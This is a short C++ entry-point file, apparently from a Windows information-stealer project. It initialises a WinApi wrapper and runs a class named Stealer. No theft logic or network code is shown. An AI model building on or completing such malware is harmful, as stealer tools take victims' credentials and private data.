#include "stealer/Stealer.h"
#include "winapi.h"

int main() {
    WinApi::Init();

    Stealer().run();

    return 0;
}
